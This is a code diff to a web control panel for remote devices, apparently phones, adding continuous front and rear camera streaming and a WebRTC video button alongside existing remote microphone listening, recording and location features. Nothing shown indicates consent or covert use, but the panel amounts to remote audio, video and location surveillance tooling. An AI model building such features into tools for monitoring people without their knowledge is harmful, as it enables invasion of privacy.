@@ -1515,6 +1515,9 @@
             renderPhotoSaved(msg);
             log(`📸 Photo saved: ${msg.filename}`, "ok");
             break;
+          case "camera_live_frame":
+            renderLiveCameraFrame(msg);
+            break;
           case "ack":
             log(`ACK ${msg.deviceId}: ${msg.message}`, "info");
             break;
@@ -1714,12 +1717,14 @@
           <div class="btn-row">
             <button class="btn-live"  id="btnLive_${deviceId}" onclick="toggleLive('${deviceId}')">▶ Live Listen</button>
             <button class="btn-rtc"   id="btnRtc_${deviceId}" onclick="toggleWebRtc('${deviceId}')">⚡ WebRTC</button>
+            <button class="btn-rtc"   id="btnRtcVideo_${deviceId}" onclick="toggleWebRtcVideo('${deviceId}')">🎬 WebRTC Video</button>
             <button class="btn-ghost" id="btnRn_${deviceId}" onclick="toggleRnnoise('${deviceId}')">RNNoise: ON</button>
             <button class="btn-rec"   id="btnRec_${deviceId}"  onclick="startRecord('${deviceId}')">⏺ Record</button>
             <button class="btn-stop"  id="btnStop_${deviceId}" onclick="stopRecord('${deviceId}')" disabled>⏹ Stop</button>
-            <button class="btn-ghost" id="btnCamLive_${deviceId}" onclick="toggleLiveCamera('${deviceId}')">🎥 Camera Live</button>
-            <button class="btn-ghost" onclick="takePhoto('${deviceId}','rear')">📷 Rear</button>
-            <button class="btn-ghost" onclick="takePhoto('${deviceId}','front')">🤳 Front</button>
+            <button class="btn-ghost" id="btnCamLiveRear_${deviceId}" onclick="toggleLiveCamera('${deviceId}','rear')">🎥 Live Rear</button>
+            <button class="btn-ghost" id="btnCamLiveFront_${deviceId}" onclick="toggleLiveCamera('${deviceId}','front')">🤳 Live Front</button>
+            <button class="btn-ghost" onclick="takePhoto('${deviceId}','rear')">📷 Photo Rear</button>
+            <button class="btn-ghost" onclick="takePhoto('${deviceId}','front')">🤳 Photo Front</button>
             <button class="btn-ghost" onclick="switchCamera('${deviceId}')">🔄 Camera</button>
             <button class="btn-ghost" id="btnPhotoQ_${deviceId}" onclick="cyclePhotoQuality('${deviceId}')">Photo: Normal</button>
             <button class="btn-ghost" id="btnPhotoAi_${deviceId}" onclick="togglePhotoAi('${deviceId}')">Photo AI: ON</button>
@@ -1732,6 +1737,7 @@
             <button class="btn-ghost" id="btnVizMode_${deviceId}" onclick="cycleVizMode('${deviceId}')">Viz: Wave</button>
           </div>
           <div class="rec-list" id="recList_${deviceId}"></div>
+          <div class="photo-list" id="liveCam_${deviceId}" style="display:none"></div>
           <div class="photo-list" id="photoList_${deviceId}"></div>
           <div class="tab-bar">
             <button class="tab-btn active" onclick="openTab('${deviceId}','location',this)">📍 Location</button>
@@ -1833,7 +1839,10 @@
           },
           photoAiEnabled: !!(health?.photoAi !== false),
           liveCameraActive: false,
+          liveCameraMode: "rear",
+          webRtcVideoActive: false,
           liveCameraTimer: null,
+          liveCameraObjectUrl: null,
         };
         const gainBtn = document.getElementById(`btnGain_${deviceId}`);
         if (gainBtn) gainBtn.textContent = `Gain: ${savedGain.toFixed(1)}x`;
@@ -1861,6 +1870,8 @@
         renderDeviceNetworkChip(deviceId, deviceState[deviceId]);
         applyNetworkModeToDevice(deviceId, deviceState[deviceId]);
         renderDeviceHealth(deviceId, deviceState[deviceId].health);
+        syncLiveCameraButtons(deviceId);
+        syncWebRtcVideoButton(deviceId);
         maybeAutoResumeLive(deviceId);
       }
 
@@ -2037,10 +2048,16 @@
       function removeDeviceCard(deviceId) {
         stopWebRtc(deviceId, false);
         const state = deviceState[deviceId];
-        if (state?.liveCameraTimer) {
-          clearInterval(state.liveCameraTimer);
-          state.liveCameraTimer = null;
+        if (state?.liveCameraActive) {
+          sendCmd(deviceId, "camera_live_stop");
           state.liveCameraActive = false;
+          state.webRtcVideoActive = false;
+        }
+        if (state?.liveCameraObjectUrl) {
+          try {
+            URL.revokeObjectURL(state.liveCameraObjectUrl);
+          } catch (_) {}
+          state.liveCameraObjectUrl = null;
         }
         const card = document.getElementById(`card_${deviceId}`);
         if (card) card.remove();
@@ -2296,32 +2313,102 @@
         sendCmd(deviceId, "switch_camera");
         log(`Camera switched for ${deviceId}`, "info");
       }
-      function toggleLiveCamera(deviceId) {
+      function cameraLiveButtonLabel(camera, active) {
+        const cam = String(camera || "rear").toLowerCase();
+        const isFront = cam === "front";
+        if (!active) return isFront ? "🤳 Live Front" : "🎥 Live Rear";
+        return isFront ? "⏹ Stop Front" : "⏹ Stop Rear";
+      }
+
+      function syncLiveCameraButtons(deviceId) {
         const state = deviceState[deviceId];
         if (!state) return;
-        const btn = document.getElementById(`btnCamLive_${deviceId}`);
-        if (state.liveCameraActive) {
-          if (state.liveCameraTimer) clearInterval(state.liveCameraTimer);
-          state.liveCameraTimer = null;
+        const rearBtn = document.getElementById(`btnCamLiveRear_${deviceId}`);
+        const frontBtn = document.getElementById(`btnCamLiveFront_${deviceId}`);
+        const activeCam = String(state.liveCameraMode || "rear").toLowerCase();
+        const rearActive = state.liveCameraActive && activeCam === "rear";
+        const frontActive = state.liveCameraActive && activeCam === "front";
+        if (rearBtn) {
+          rearBtn.textContent = cameraLiveButtonLabel("rear", rearActive);
+          rearBtn.classList.toggle("active", rearActive);
+        }
+        if (frontBtn) {
+          frontBtn.textContent = cameraLiveButtonLabel("front", frontActive);
+          frontBtn.classList.toggle("active", frontActive);
+        }
+        syncWebRtcVideoButton(deviceId);
+      }
+
+      function syncWebRtcVideoButton(deviceId) {
+        const state = deviceState[deviceId];
+        if (!state) return;
+        const btn = document.getElementById(`btnRtcVideo_${deviceId}`);
+        if (!btn) return;
+        const active = state.webRtcVideoActive === true;
+        btn.textContent = active ? "⏹ Stop Video" : "🎬 WebRTC Video";
+        btn.classList.toggle("active", active);
+      }
+
+      function toggleWebRtcVideo(deviceId) {
+        const state = deviceState[deviceId];
+        if (!state) return;
+        if (state.webRtcVideoActive) {
+          state.webRtcVideoActive = false;
+          if (state.liveCameraActive) {
+            state.liveCameraActive = false;
+            sendCmd(deviceId, "camera_live_stop");
+          }
+          const liveWrap = document.getElementById(`liveCam_${deviceId}`);
+          if (liveWrap) liveWrap.style.display = "none";
+          syncLiveCameraButtons(deviceId);
+          log(`WebRTC video stopped for ${deviceId}`, "info");
+          return;
+        }
+        // Until native WebRTC video track is enabled on device, this button
+        // uses the existing continuous camera stream channel.
+        state.webRtcVideoActive = true;
+        state.liveCameraActive = true;
+        state.liveCameraMode = state.liveCameraMode || "rear";
+        sendCmd(deviceId, "camera_live_start", { camera: state.liveCameraMode });
+        const liveWrap = document.getElementById(`liveCam_${deviceId}`);
+        if (liveWrap) liveWrap.style.display = "grid";
+        syncLiveCameraButtons(deviceId);
+        log(`WebRTC video started for ${deviceId} (${state.liveCameraMode})`, "ok");
+      }
+
+      function toggleLiveCamera(deviceId, camera = "current") {
+        const state = deviceState[deviceId];
+        if (!state) return;
+        const cam = String(camera || "current").toLowerCase();
+        const requestedCam =
+          cam === "front" || cam === "rear" || cam === "back"
+            ? cam === "back"
+              ? "rear"
+              : cam
+            : String(state.liveCameraMode || "rear").toLowerCase();
+
+        if (state.liveCameraActive && state.liveCameraMode === requestedCam) {
           state.liveCameraActive = false;
-          if (btn) btn.textContent = "🎥 Camera Live";
+          state.webRtcVideoActive = false;
+          sendCmd(deviceId, "camera_live_stop");
+          const liveWrap = document.getElementById(`liveCam_${deviceId}`);
+          if (liveWrap) liveWrap.style.display = "none";
+          syncLiveCameraButtons(deviceId);
           log(`Live camera stopped for ${deviceId}`, "info");
           return;
         }
+
+        state.liveCameraMode = requestedCam;
         state.liveCameraActive = true;
-        if (btn) btn.textContent = "⏹ Stop Cam";
-        const tick = () => {
-          if (!deviceState[deviceId]?.liveCameraActive) return;
-          takePhoto(deviceId, "current");
-        };
-        tick();
-        const qualityMode = state.photoQuality || "normal";
-        let intervalMs = isLowNetworkModeActive() ? 3200 : 1700;
-        if (qualityMode === "fast")
-          intervalMs = Math.max(1200, intervalMs - 400);
-        if (qualityMode === "hd") intervalMs = intervalMs + 900;
-        state.liveCameraTimer = setInterval(tick, intervalMs);
-        log(`Live camera started for ${deviceId}`, "ok");
+        state.webRtcVideoActive = false;
+        sendCmd(deviceId, "camera_live_start", { camera: state.liveCameraMode });
+        const liveWrap = document.getElementById(`liveCam_${deviceId}`);
+        if (liveWrap) liveWrap.style.display = "grid";
+        syncLiveCameraButtons(deviceId);
+        log(
+          `Live camera started for ${deviceId} (${state.liveCameraMode}, continuous stream)`,
+          "ok",
+        );
       }
 
       function cyclePhotoQuality(deviceId) {
@@ -2336,15 +2423,52 @@
           btn.textContent = `Photo: ${photoQualityLabel(state.photoQuality)}`;
         sendCmd(deviceId, "photo_quality", { mode: state.photoQuality });
         if (state.liveCameraActive) {
-          if (state.liveCameraTimer) clearInterval(state.liveCameraTimer);
-          state.liveCameraTimer = null;
-          state.liveCameraActive = false;
-          toggleLiveCamera(deviceId);
+          sendCmd(deviceId, "camera_live_start", {
+            camera: state.liveCameraMode || "rear",
+          });
         }
         log(
           `Photo quality ${photoQualityLabel(state.photoQuality)} for ${deviceId}`,
           "info",
         );
+      }
+
+      function renderLiveCameraFrame(msg) {
+        if (!msg?.deviceId || !msg?.data) return;
+        const state = deviceState[msg.deviceId];
+        if (!state || !state.liveCameraActive) return;
+        const frameCamera = String(msg.camera || "rear").toLowerCase();
+        const wantedCamera = String(state.liveCameraMode || "rear").toLowerCase();
+        if (frameCamera !== wantedCamera) return;
+        const wrap = document.getElementById(`liveCam_${msg.deviceId}`);
+        if (!wrap) return;
+        wrap.style.display = "grid";
+        let img = document.getElementById(`liveCamImg_${msg.deviceId}`);
+        if (!img) {
+          img = document.createElement("img");
+          img.id = `liveCamImg_${msg.deviceId}`;
+          img.className = "photo-thumb";
+          img.style.width = "100%";
+          img.style.maxWidth = "420px";
+          img.style.maxHeight = "240px";
+          img.style.objectFit = "cover";
+          wrap.appendChild(img);
+        }
+        const raw = atob(String(msg.data));
+        const len = raw.length;
+        const bytes = new Uint8Array(len);
+        for (let i = 0; i < len; i++) bytes[i] = raw.charCodeAt(i);
+        const blob = new Blob([bytes], {
+          type: String(msg.mime || "image/jpeg"),
+        });
+        const nextUrl = URL.createObjectURL(blob);
+        img.src = nextUrl;
+        if (state.liveCameraObjectUrl) {
+          try {
+            URL.revokeObjectURL(state.liveCameraObjectUrl);
+          } catch (_) {}
+        }
+        state.liveCameraObjectUrl = nextUrl;
       }
       function togglePhotoAi(deviceId) {
         const state = deviceState[deviceId];
